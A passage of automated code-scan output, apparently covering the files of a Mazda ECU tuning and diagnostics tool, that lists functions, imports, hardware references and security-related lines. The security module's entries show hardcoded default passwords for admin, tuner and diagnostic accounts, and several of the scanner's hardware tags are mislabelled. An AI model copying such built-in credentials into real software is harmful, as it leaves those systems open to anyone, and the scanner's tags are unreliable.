{"type": "hardware", "line": 660, "hardware": "ECU", "content": "if credentials and credentials.security_level.value >= SecurityLevel.DIAGNOSTIC.value:"}, {"type": "hardware", "line": 670, "hardware": "ECU", "content": "async def get_supported_pids(self, credentials: Optional[SecurityCredentials] = None) -> List[str]:"}, {"type": "hardware", "line": 675, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 699, "hardware": "ECU", "content": "async def clear_dtc(self, credentials: Optional[SecurityCredentials] = None) -> bool:"}, {"type": "hardware", "line": 704, "hardware": "ECU", "content": "credentials: Security credentials (requires DIAGNOSTIC level)"}, {"type": "hardware", "line": 711, "hardware": "ECU", "content": "from mazda_security_core import MazdaSecurityCore"}, {"type": "hardware", "line": 712, "hardware": "ECU", "content": "security = MazdaSecurityCore()"}, {"type": "hardware", "line": 713, "hardware": "ECU", "content": "security.authorize_operation(credentials, SecurityLevel.DIAGNOSTIC, \"clear DTCs\")"}, {"type": "hardware", "line": 725, "hardware": "ECU", "content": "async def get_vin(self, credentials: Optional[SecurityCredentials] = None) -> str:"}, {"type": "hardware", "line": 727, "hardware": "vehicle", "content": "Get Vehicle Identification Number."}, {"type": "hardware", "line": 730, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 735, "hardware": "vehicle", "content": "response = await self.send_command(OBDCommandMode.VEHICLE_INFO, \"2\", credentials=credentials)"}, {"type": "hardware", "line": 747, "hardware": "ECU", "content": "async def get_ecu_info(self, credentials: Optional[SecurityCredentials] = None) -> Dict[str, str]:"}, {"type": "hardware", "line": 749, "hardware": "ECU", "content": "Get ECU identification information."}, {"type": "hardware", "line": 752, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 755, "hardware": "ECU", "content": "Dictionary with ECU info"}, {"type": "hardware", "line": 761, "hardware": "vehicle", "content": "response = await self.send_command(OBDCommandMode.VEHICLE_INFO, \"6\", credentials=credentials)"}, {"type": "hardware", "line": 770, "hardware": "vehicle", "content": "response = await self.send_command(OBDCommandMode.VEHICLE_INFO, \"12\", credentials=credentials)"}, {"type": "hardware", "line": 772, "hardware": "ECU", "content": "ecu_data = response.data[3:]"}, {"type": "hardware", "line": 773, "hardware": "ECU", "content": "info[\"ecu_name\"] = ecu_data.decode('ascii', errors='ignore').strip()"}, {"type": "hardware", "line": 775, "hardware": "ECU", "content": "self.logger.warning(f\"Failed to get ECU name: {e}\")"}], "security_logic": [{"type": "security_pattern", "line": 44, "pattern": "security_access", "content": "SECURITY_ACCESS_DENIED = \"33\""}, {"type": "security_pattern", "line": 434, "pattern": "authorization", "content": "credentials: Security credentials for authorization"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_protocols/__init__.py", "lines_read": 1, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_security_core.py", "lines_read": 517, "features_found": [{"type": "function", "name": "__init__", "line": 47}, {"type": "function", "name": "_generate_master_key", "line": 94}, {"type": "function", "name": "_hash_password", "line": 98}, {"type": "function", "name": "_verify_password", "line": 123}, {"type": "function", "name": "_is_account_locked", "line": 152}, {"type": "function", "name": "_record_failed_attempt", "line": 172}, {"type": "function", "name": "_generate_session_token", "line": 186}, {"type": "function", "name": "_log_access", "line": 190}, {"type": "function", "name": "authenticate", "line": 205}, {"type": "function", "name": "validate_session", "line": 258}, {"type": "function", "name": "authorize_operation", "line": 284}, {"type": "function", "name": "encrypt_data", "line": 315}, {"type": "function", "name": "decrypt_data", "line": 332}, {"type": "function", "name": "secure_hash", "line": 355}, {"type": "function", "name": "verify_hash", "line": 372}, {"type": "function", "name": "logout", "line": 395}, {"type": "function", "name": "get_active_sessions", "line": 412}, {"type": "function", "name": "get_access_log", "line": 416}, {"type": "function", "name": "cleanup_expired_sessions", "line": 438}, {"type": "function", "name": "validate_tuning_parameter", "line": 459}, {"type": "function", "name": "validate_flash_operation", "line": 478}, {"type": "function", "name": "export_security_config", "line": 497}, {"type": "function", "name": "__del__", "line": 512}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "cryptography.fernet", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.kdf.pbkdf2", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "models", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "secrets", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "datetime,", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "Fernet", "line": null}, {"type": "import", "module": "hashes", "line": null}, {"type": "import", "module": "PBKDF2HMAC", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}, {"type": "import", "module": "base64", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "(", "line": null}], "components_found": [{"type": "class", "name": "SecurityError", "line": 26}, {"type": "class", "name": "AuthenticationError", "line": 31}, {"type": "class", "name": "AuthorizationError", "line": 36}, {"type": "class", "name": "MazdaSecurityCore", "line": 41}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "ECU", "content": "MazdaSecurityCore - Authentication, encryption, and access control for ECU operations."}, {"type": "hardware", "line": 3, "hardware": "ECU", "content": "Provides security layer for all tuning operations with role-based access control."}, {"type": "hardware", "line": 21, "hardware": "ECU", "content": "SecurityLevel, SecurityCredentials, LogEntry,"}, {"type": "hardware", "line": 22, "hardware": "ECU", "content": "SecurityContext, TuningParameter, FlashOperation"}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "class SecurityError(Exception):"}, {"type": "hardware", "line": 27, "hardware": "ECU", "content": "\"\"\"Security-related exceptions.\"\"\""}, {"type": "hardware", "line": 31, "hardware": "ECU", "content": "class AuthenticationError(SecurityError):"}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "class AuthorizationError(SecurityError):"}, {"type": "hardware", "line": 41, "hardware": "ECU", "content": "class MazdaSecurityCore:"}, {"type": "hardware", "line": 43, "hardware": "ECU", "content": "Core security module for Mazda ECU access and tuning operations."}, {"type": "hardware", "line": 49, "hardware": "ECU", "content": "Initialize security core."}, {"type": "hardware", "line": 69, "hardware": "ECU", "content": "self.active_sessions: Dict[str, SecurityCredentials] = {}"}, {"type": "hardware", "line": 77, "hardware": "ECU", "content": "\"security_level\": SecurityLevel.ADMIN,"}, {"type": "hardware", "line": 82, "hardware": "ECU", "content": "\"security_level\": SecurityLevel.TUNING,"}, {"type": "hardware", "line": 87, "hardware": "ECU", "content": "\"security_level\": SecurityLevel.DIAGNOSTIC,"}, {"type": "hardware", "line": 92, "hardware": "ECU", "content": "self.logger.info(\"MazdaSecurityCore initialized\")"}, {"type": "hardware", "line": 95, "hardware": "ECU", "content": "\"\"\"Generate cryptographically secure master key.\"\"\""}, {"type": "hardware", "line": 187, "hardware": "ECU", "content": "\"\"\"Generate cryptographically secure session token.\"\"\""}, {"type": "hardware", "line": 192, "hardware": "ECU", "content": "\"\"\"Log security access event.\"\"\""}, {"type": "hardware", "line": 205, "hardware": "ECU", "content": "def authenticate(self, username: str, password: str) -> SecurityCredentials:"}, {"type": "hardware", "line": 214, "hardware": "ECU", "content": "SecurityCredentials object"}, {"type": "hardware", "line": 218, "hardware": "ECU", "content": "SecurityError: If account is locked"}, {"type": "hardware", "line": 223, "hardware": "ECU", "content": "raise SecurityError(f\"Account {username} is locked\")"}, {"type": "hardware", "line": 244, "hardware": "ECU", "content": "credentials = SecurityCredentials("}, {"type": "hardware", "line": 247, "hardware": "ECU", "content": "security_level=user_data[\"security_level\"],"}, {"type": "hardware", "line": 258, "hardware": "ECU", "content": "def validate_session(self, session_token: str) -> SecurityContext:"}, {"type": "hardware", "line": 266, "hardware": "ECU", "content": "SecurityCredentials if valid, None if expired/invalid"}, {"type": "hardware", "line": 284, "hardware": "ECU", "content": "def authorize_operation(self, credentials: SecurityCredentials,"}, {"type": "hardware", "line": 285, "hardware": "ECU", "content": "required_level: SecurityLevel,"}, {"type": "hardware", "line": 292, "hardware": "ECU", "content": "required_level: Minimum security level required"}, {"type": "hardware", "line": 306, "hardware": "ECU", "content": "if credentials.security_level.value < required_level.value:"}, {"type": "hardware", "line": 321, "hardware": "ECU", "content": "context: Optional context for additional security"}, {"type": "hardware", "line": 351, "hardware": "ECU", "content": "raise SecurityError(\"Invalid context in decrypted data\")"}, {"type": "hardware", "line": 355, "hardware": "ECU", "content": "def secure_hash(self, data: bytes, salt: Optional[bytes] = None) -> str:"}, {"type": "hardware", "line": 357, "hardware": "ECU", "content": "Generate secure hash of data."}, {"type": "hardware", "line": 412, "hardware": "ECU", "content": "def get_active_sessions(self) -> List[SecurityCredentials]:"}, {"type": "hardware", "line": 459, "hardware": "ECU", "content": "def validate_tuning_parameter(self, credentials: SecurityCredentials,"}, {"type": "hardware", "line": 474, "hardware": "ECU", "content": "self.authorize_operation(credentials, parameter.security_level,"}, {"type": "hardware", "line": 478, "hardware": "ECU", "content": "def validate_flash_operation(self, credentials: SecurityCredentials,"}, {"type": "hardware", "line": 493, "hardware": "ECU", "content": "self.authorize_operation(credentials, SecurityLevel.FLASH,"}, {"type": "hardware", "line": 497, "hardware": "ECU", "content": "def export_security_config(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 499, "hardware": "ECU", "content": "Export security configuration (without sensitive data)."}, {"type": "hardware", "line": 502, "hardware": "ECU", "content": "Security configuration dictionary"}, {"type": "hardware", "line": 516, "hardware": "ECU", "content": "self.logger.info(\"MazdaSecurityCore shutdown\")"}], "security_logic": [{"type": "security_pattern", "line": 2, "pattern": "encrypt", "content": "MazdaSecurityCore - Authentication, encryption, and access control for ECU operations."}, {"type": "security_pattern", "line": 6, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 12, "pattern": "hash", "content": "from cryptography.hazmat.primitives import hashes"}, {"type": "security_pattern", "line": 14, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 14, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 36, "pattern": "authorization", "content": "class AuthorizationError(SecurityError):"}, {"type": "security_pattern", "line": 44, "pattern": "encrypt", "content": "Handles authentication, authorization, encryption, and audit logging."}, {"type": "security_pattern", "line": 44, "pattern": "authorization", "content": "Handles authentication, authorization, encryption, and audit logging."}, {"type": "security_pattern", "line": 47, "pattern": "key", "content": "def __init__(self, master_key: Optional[bytes] = None):"}, {"type": "security_pattern", "line": 52, "pattern": "key", "content": "master_key: Optional master encryption key. Generated if not provided."}, {"type": "security_pattern", "line": 52, "pattern": "encrypt", "content": "master_key: Optional master encryption key. Generated if not provided."}, {"type": "security_pattern", "line": 57, "pattern": "key", "content": "self.master_key = master_key or self._generate_master_key()"}, {"type": "security_pattern", "line": 60, "pattern": "key", "content": "self.fernet = Fernet(self.master_key)"}, {"type": "security_pattern", "line": 76, "pattern": "password", "content": "\"password_hash\": self._hash_password(\"admin123\"),"}, {"type": "security_pattern", "line": 76, "pattern": "hash", "content": "\"password_hash\": self._hash_password(\"admin123\"),"}, {"type": "security_pattern", "line": 81, "pattern": "password", "content": "\"password_hash\": self._hash_password(\"tuner456\"),"}, {"type": "security_pattern", "line": 81, "pattern": "hash", "content": "\"password_hash\": self._hash_password(\"tuner456\"),"}, {"type": "security_pattern", "line": 86, "pattern": "password", "content": "\"password_hash\": self._hash_password(\"diag789\"),"}, {"type": "security_pattern", "line": 86, "pattern": "hash", "content": "\"password_hash\": self._hash_password(\"diag789\"),"}, {"type": "security_pattern", "line": 94, "pattern": "key", "content": "def _generate_master_key(self) -> bytes:"}, {"type": "security_pattern", "line": 95, "pattern": "key", "content": "\"\"\"Generate cryptographically secure master key.\"\"\""}, {"type": "security_pattern", "line": 96, "pattern": "key", "content": "return Fernet.generate_key()"}, {"type": "security_pattern", "line": 98, "pattern": "password", "content": "def _hash_password(self, password: str, salt: Optional[bytes] = None) -> str:"}, {"type": "security_pattern", "line": 98, "pattern": "hash", "content": "def _hash_password(self, password: str, salt: Optional[bytes] = None) -> str:"}, {"type": "security_pattern", "line": 100, "pattern": "password", "content": "Hash password using PBKDF2."}, {"type": "security_pattern", "line": 100, "pattern": "hash", "content": "Hash password using PBKDF2."}, {"type": "security_pattern", "line": 103, "pattern": "password", "content": "password: Plain text password"}, {"type": "security_pattern", "line": 107, "pattern": "hash", "content": "Hex-encoded hash with salt"}, {"type": "security_pattern", "line": 113, "pattern": "algorithm", "content": "algorithm=hashes.SHA256(),"}, {"type": "security_pattern", "line": 113, "pattern": "hash", "content": "algorithm=hashes.SHA256(),"}, {"type": "security_pattern", "line": 120, "pattern": "password", "content": "hash_bytes = kdf.derive(password.encode())"}, {"type": "security_pattern", "line": 120, "pattern": "hash", "content": "hash_bytes = kdf.derive(password.encode())"}, {"type": "security_pattern", "line": 121, "pattern": "hash", "content": "return base64.b64encode(salt + hash_bytes).decode()"}, {"type": "security_pattern", "line": 123, "pattern": "password", "content": "def _verify_password(self, password: str, stored_hash: str) -> bool:"}, {"type": "security_pattern", "line": 123, "pattern": "hash", "content": "def _verify_password(self, password: str, stored_hash: str) -> bool:"}, {"type": "security_pattern", "line": 125, "pattern": "password", "content": "Verify password against stored hash."}, {"type": "security_pattern", "line": 125, "pattern": "hash", "content": "Verify password against stored hash."}, {"type": "security_pattern", "line": 128, "pattern": "password", "content": "password: Plain text password to verify"}, {"type": "security_pattern", "line": 129, "pattern": "password", "content": "stored_hash: Stored password hash"}, {"type": "security_pattern", "line": 129, "pattern": "hash", "content": "stored_hash: Stored password hash"}, {"type": "security_pattern", "line": 132, "pattern": "password", "content": "True if password matches"}, {"type": "security_pattern", "line": 135, "pattern": "hash", "content": "decoded = base64.b64decode(stored_hash.encode())"}, {"type": "security_pattern", "line": 137, "pattern": "hash", "content": "stored_hash_bytes = decoded[32:]"}, {"type": "security_pattern", "line": 140, "pattern": "algorithm", "content": "algorithm=hashes.SHA256(),"}, {"type": "security_pattern", "line": 140, "pattern": "hash", "content": "algorithm=hashes.SHA256(),"}, {"type": "security_pattern", "line": 147, "pattern": "password", "content": "hash_bytes = kdf.derive(password.encode())"}, {"type": "security_pattern", "line": 147, "pattern": "hash", "content": "hash_bytes = kdf.derive(password.encode())"}, {"type": "security_pattern", "line": 148, "pattern": "hash", "content": "return secrets.compare_digest(hash_bytes, stored_hash_bytes)"}, {"type": "security_pattern", "line": 205, "pattern": "password", "content": "def authenticate(self, username: str, password: str) -> SecurityCredentials:"}, {"type": "security_pattern", "line": 205, "pattern": "authenticate", "content": "def authenticate(self, username: str, password: str) -> SecurityCredentials:"}, {"type": "security_pattern", "line": 207, "pattern": "authenticate", "content": "Authenticate user and create session."}, {"type": "security_pattern", "line": 211, "pattern": "password", "content": "password: Plain text password"}, {"type": "security_pattern", "line": 229, "pattern": "password", "content": "raise AuthenticationError(\"Invalid username or password\")"}, {"type": "security_pattern", "line": 232, "pattern": "password", "content": "if not self._verify_password(password, user_data[\"password_hash\"]):"}, {"type": "security_pattern", "line": 232, "pattern": "hash", "content": "if not self._verify_password(password, user_data[\"password_hash\"]):"}, {"type": "security_pattern", "line": 235, "pattern": "password", "content": "f\"Failed password attempt for user: {username}\")"}, {"type": "security_pattern", "line": 236, "pattern": "password", "content": "raise AuthenticationError(\"Invalid username or password\")"}, {"type": "security_pattern", "line": 246, "pattern": "password", "content": "password_hash=user_data[\"password_hash\"],"}, {"type": "security_pattern", "line": 246, "pattern": "hash", "content": "password_hash=user_data[\"password_hash\"],"}, {"type": "security_pattern", "line": 254, "pattern": "authenticate", "content": "self._log_access(\"INFO\", \"AUTH\", f\"User authenticated: {username}\")"}, {"type": "security_pattern", "line": 299, "pattern": "authorization", "content": "AuthorizationError: If not authorized"}, {"type": "security_pattern", "line": 303, "pattern": "authorization", "content": "f\"Authorization attempt with invalid credentials\")"}, {"type": "security_pattern", "line": 304, "pattern": "authorization", "content": "raise AuthorizationError(\"Invalid or expired credentials\")"}, {"type": "security_pattern", "line": 309, "pattern": "authorization", "content": "raise AuthorizationError(f\"Insufficient privileges for {operation}\")"}, {"type": "security_pattern", "line": 315, "pattern": "encrypt", "content": "def encrypt_data(self, data: bytes, context: Optional[bytes] = None) -> bytes:"}, {"type": "security_pattern", "line": 317, "pattern": "encrypt", "content": "Encrypt data using Fernet symmetric encryption."}, {"type": "security_pattern", "line": 320, "pattern": "encrypt", "content": "data: Data to encrypt"}, {"type": "security_pattern", "line": 324, "pattern": "encrypt", "content": "Encrypted data"}, {"type": "security_pattern", "line": 329, "pattern": "encrypt", "content": "return self.fernet.encrypt(data_with_context)"}, {"type": "security_pattern", "line": 330, "pattern": "encrypt", "content": "return self.fernet.encrypt(data)"}, {"type": "security_pattern", "line": 332, "pattern": "encrypt", "content": "def decrypt_data(self, encrypted_data: bytes,"}, {"type": "security_pattern", "line": 332, "pattern": "decrypt", "content": "def decrypt_data(self, encrypted_data: bytes,"}, {"type": "security_pattern", "line": 335, "pattern": "encrypt", "content": "Decrypt data using Fernet symmetric encryption."}, {"type": "security_pattern", "line": 335, "pattern": "decrypt", "content": "Decrypt data using Fernet symmetric encryption."}, {"type": "security_pattern", "line": 338, "pattern": "encrypt", "content": "encrypted_data: Data to decrypt"}, {"type": "security_pattern", "line": 338, "pattern": "decrypt", "content": "encrypted_data: Data to decrypt"}, {"type": "security_pattern", "line": 339, "pattern": "encrypt", "content": "context: Optional context that was added during encryption"}, {"type": "security_pattern", "line": 342, "pattern": "decrypt", "content": "Decrypted data"}, {"type": "security_pattern", "line": 344, "pattern": "encrypt", "content": "decrypted = self.fernet.decrypt(encrypted_data)"}, {"type": "security_pattern", "line": 344, "pattern": "decrypt", "content": "decrypted = self.fernet.decrypt(encrypted_data)"}, {"type": "security_pattern", "line": 348, "pattern": "decrypt", "content": "if decrypted.startswith(context):"}, {"type": "security_pattern", "line": 349, "pattern": "decrypt", "content": "return decrypted[len(context):]"}, {"type": "security_pattern", "line": 351, "pattern": "decrypt", "content": "raise SecurityError(\"Invalid context in decrypted data\")"}, {"type": "security_pattern", "line": 353, "pattern": "decrypt", "content": "return decrypted"}, {"type": "security_pattern", "line": 355, "pattern": "hash", "content": "def secure_hash(self, data: bytes, salt: Optional[bytes] = None) -> str:"}, {"type": "security_pattern", "line": 357, "pattern": "hash", "content": "Generate secure hash of data."}, {"type": "security_pattern", "line": 360, "pattern": "hash", "content": "data: Data to hash"}, {"type": "security_pattern", "line": 364, "pattern": "hash", "content": "Hex-encoded hash"}, {"type": "security_pattern", "line": 369, "pattern": "hash", "content": "hash_obj = hashlib.sha256(salt + data)"}, {"type": "security_pattern", "line": 370, "pattern": "hash", "content": "return base64.b64encode(salt + hash_obj.digest()).decode()"}, {"type": "security_pattern", "line": 372, "pattern": "hash", "content": "def verify_hash(self, data: bytes, stored_hash: str) -> bool:"}, {"type": "security_pattern", "line": 374, "pattern": "hash", "content": "Verify data against stored hash."}, {"type": "security_pattern", "line": 378, "pattern": "hash", "content": "stored_hash: Stored hash"}, {"type": "security_pattern", "line": 381, "pattern": "hash", "content": "True if data matches hash"}, {"type": "security_pattern", "line": 384, "pattern": "hash", "content": "decoded = base64.b64decode(stored_hash.encode())"}, {"type": "security_pattern", "line": 386, "pattern": "hash", "content": "stored_hash_bytes = decoded[16:]"}, {"type": "security_pattern", "line": 388, "pattern": "hash", "content": "hash_obj = hashlib.sha256(salt + data)"}, {"type": "security_pattern", "line": 389, "pattern": "hash", "content": "computed_hash = hash_obj.digest()"}, {"type": "security_pattern", "line": 391, "pattern": "hash", "content": "return secrets.compare_digest(computed_hash, stored_hash_bytes)"}, {"type": "security_pattern", "line": 472, "pattern": "authorization", "content": "AuthorizationError: If not authorized"}, {"type": "security_pattern", "line": 491, "pattern": "authorization", "content": "AuthorizationError: If not authorized"}, {"type": "security_pattern", "line": 509, "pattern": "key", "content": "\"users\": list(self.users.keys()),"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["security"]}
{"file_path": "mazda_tool/__init__.py", "lines_read": 1, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_tool/core/__init__.py", "lines_read": 1, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_tool/core/advanced_diagnostics.py", "lines_read": 160, "features_found": [{"type": "function", "name": "__init__", "line": 7}, {"type": "function", "name": "_load_known_issues", "line": 16}, {"type": "function", "name": "run_comprehensive_diagnostic", "line": 45}, {"type": "function", "name": "_analyze_turbo_health", "line": 78}, {"type": "function", "name": "_analyze_fuel_system_health", "line": 121}], "components_found": [{"type": "class", "name": "MazdaAdvancedDiagnostics", "line": 2}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 46, "hardware": "ECU", "content": "\"\"\"Execute full vehicle health assessment\"\"\""}, {"type": "hardware", "line": 46, "hardware": "vehicle", "content": "\"\"\"Execute full vehicle health assessment\"\"\""}, {"type": "hardware", "line": 155, "hardware": "ABS", "content": "if abs(fuel_trim) > 10:"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["diagnostic"]}
{"file_path": "mazda_tool/core/ai_tuner.py", "lines_read": 731, "features_found": [{"type": "function", "name": "__init__", "line": 47}, {"type": "function", "name": "_load_mazda_knowledge", "line": 72}, {"type": "function", "name": "start_learning_session", "line": 125}, {"type": "function", "name": "stop_learning_session", "line": 166}, {"type": "function", "name": "process_driving_data", "line": 183}, {"type": "function", "name": "_analyze_initial_driving_style", "line": 215}, {"type": "function", "name": "_get_driving_context", "line": 238}, {"type": "function", "name": "_generate_tuning_recommendation", "line": 259}, {"type": "function", "name": "_analyze_driving_patterns", "line": 279}, {"type": "function", "name": "_calculate_rpm_distribution", "line": 338}, {"type": "function", "name": "_analyze_throttle_usage", "line": 356}, {"type": "function", "name": "_analyze_context_usage", "line": 372}, {"type": "function", "name": "_update_driving_profile", "line": 385}, {"type": "function", "name": "_create_performance_adjustment", "line": 415}, {"type": "function", "name": "_create_efficiency_adjustment", "line": 448}, {"type": "function", "name": "_create_balanced_adjustment", "line": 481}, {"type": "function", "name": "_create_adaptive_adjustment", "line": 512}, {"type": "function", "name": "generate_ai_tuning_report", "line": 543}, {"type": "function", "name": "_classify_driving_style", "line": 570}, {"type": "function", "name": "_generate_all_recommendations", "line": 588}, {"type": "function", "name": "_generate_mazda_insights", "line": 626}, {"type": "function", "name": "_get_learning_next_steps", "line": 660}, {"type": "function", "name": "_perform_vehicle_health_check", "line": 682}, {"type": "function", "name": "get_session_stats", "line": 720}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "pandas", "line": null}, {"type": "import", "module": "datetime,", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "statistics", "line": null}], "components_found": [{"type": "class", "name": "DrivingPattern", "line": 13}, {"type": "class", "name": "TuningAdjustment", "line": 24}, {"type": "class", "name": "MazdaAITuner", "line": 34}], "algorithms": [{"type": "algorithm_function", "line": 338, "content": "def _calculate_rpm_distribution(self, rpm_values: List[float]) -> Dict[str, float]:"}], "protocols": [{"type": "protocol", "line": 188, "protocol": "OBD", "content": "real_time_data: Dictionary of OBD-II parameters"}], "hardware_assumptions": [{"type": "hardware", "line": 75, "hardware": "vehicle", "content": "\"vehicle_limits\": {"}, {"type": "hardware", "line": 125, "hardware": "vehicle", "content": "def start_learning_session(self, vehicle_profile: Dict) -> str:"}, {"type": "hardware", "line": 130, "hardware": "vehicle", "content": "vehicle_profile: Dictionary containing vehicle information"}, {"type": "hardware", "line": 140, "hardware": "vehicle", "content": "self.driving_profile = self._analyze_initial_driving_style(vehicle_profile)"}, {"type": "hardware", "line": 146, "hardware": "vehicle", "content": "Vehicle: {vehicle_profile.get('model', 'Mazdaspeed 3')}"}, {"type": "hardware", "line": 215, "hardware": "vehicle", "content": "def _analyze_initial_driving_style(self, vehicle_profile: Dict) -> Dict:"}, {"type": "hardware", "line": 216, "hardware": "vehicle", "content": "\"\"\"Analyze initial driving style based on vehicle profile and early data\"\"\""}, {"type": "hardware", "line": 567, "hardware": "vehicle", "content": "\"vehicle_health_check\": self._perform_vehicle_health_check()"}, {"type": "hardware", "line": 682, "hardware": "vehicle", "content": "def _perform_vehicle_health_check(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 683, "hardware": "vehicle", "content": "\"\"\"Perform basic vehicle health check based on driving data\"\"\""}, {"type": "hardware", "line": 698, "hardware": "vehicle", "content": "if max_boost > self.mazda_knowledge_base['vehicle_limits']['k04_turbo_max_safe_boost']:"}, {"type": "hardware", "line": 702, "hardware": "vehicle", "content": "if max_rpm > self.mazda_knowledge_base['vehicle_limits']['redline_rpm']:"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "mazda_tool/core/ai_tuning_engine.py", "lines_read": 220, "features_found": [{"type": "function", "name": "__init__", "line": 13}, {"type": "function", "name": "_load_mazda_knowledge_base", "line": 32}, {"type": "function", "name": "_initialize_models", "line": 80}, {"type": "function", "name": "_create_new_models", "line": 93}, {"type": "function", "name": "process_driving_data", "line": 116}, {"type": "function", "name": "_extract_features", "line": 137}, {"type": "function", "name": "_classify_driving_style", "line": 163}, {"type": "function", "name": "_generate_recommendations", "line": 178}, {"type": "function", "name": "_adaptive_fine_tuning", "line": 201}, {"type": "import", "module": "sklearn.ensemble", "line": null}, {"type": "import", "module": "sklearn.cluster", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "RandomForestRegressor", "line": null}, {"type": "import", "module": "KMeans", "line": null}, {"type": "import", "module": "joblib", "line": null}, {"type": "import", "module": "json", "line": null}], "components_found": [{"type": "class", "name": "MazdaAITuner", "line": 8}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 202, "hardware": "vehicle", "content": "\"\"\"Apply fine-tuning adjustments based on vehicle response data\"\"\""}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "mazda_tool/core/config_manager.py", "lines_read": 100, "features_found": [{"type": "function", "name": "__init__", "line": 9}, {"type": "function", "name": "load_configurations", "line": 60}, {"type": "function", "name": "load_json_file", "line": 67}, {"type": "function", "name": "save_settings", "line": 81}, {"type": "function", "name": "get_vehicle_profile", "line": 90}, {"type": "function", "name": "update_setting", "line": 94}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "logging", "line": null}], "components_found": [{"type": "class", "name": "ConfigManager", "line": 8}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 13, "hardware": "vehicle", "content": "self.vehicle_profiles_file = self.config_dir / \"vehicle_profiles.json\""}, {"type": "hardware", "line": 23, "hardware": "vehicle", "content": "\"vehicle\": {"}, {"type": "hardware", "line": 42, "hardware": "vehicle", "content": "self.default_vehicle_profiles = {"}, {"type": "hardware", "line": 46, "hardware": "ECU", "content": "\"supported_features\": [\"ECU_TUNING\", \"DTC_READING\", \"DATA_LOGGING\"],"}, {"type": "hardware", "line": 53, "hardware": "ECU", "content": "\"supported_features\": [\"ECU_TUNING\", \"DTC_READING\", \"FUEL_ECONOMY\"],"}, {"type": "hardware", "line": 63, "hardware": "vehicle", "content": "self.vehicle_profiles = self.load_json_file("}, {"type": "hardware", "line": 64, "hardware": "vehicle", "content": "self.vehicle_profiles_file, self.default_vehicle_profiles"}, {"type": "hardware", "line": 90, "hardware": "vehicle", "content": "def get_vehicle_profile(self, model: str) -> Optional[Dict[str, Any]]:"}, {"type": "hardware", "line": 91, "hardware": "vehicle", "content": "\"\"\"Get vehicle profile by model name\"\"\""}, {"type": "hardware", "line": 92, "hardware": "vehicle", "content": "return self.vehicle_profiles.get(model.lower())"}], "security_logic": [{"type": "security_pattern", "line": 94, "pattern": "key", "content": "def update_setting(self, category: str, key: str, value: Any):"}, {"type": "security_pattern", "line": 96, "pattern": "key", "content": "if category in self.settings and key in self.settings[category]:"}, {"type": "security_pattern", "line": 97, "pattern": "key", "content": "self.settings[category][key] = value"}, {"type": "security_pattern", "line": 100, "pattern": "key", "content": "self.logger.warning(f\"Setting not found: {category}.{key}\")"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
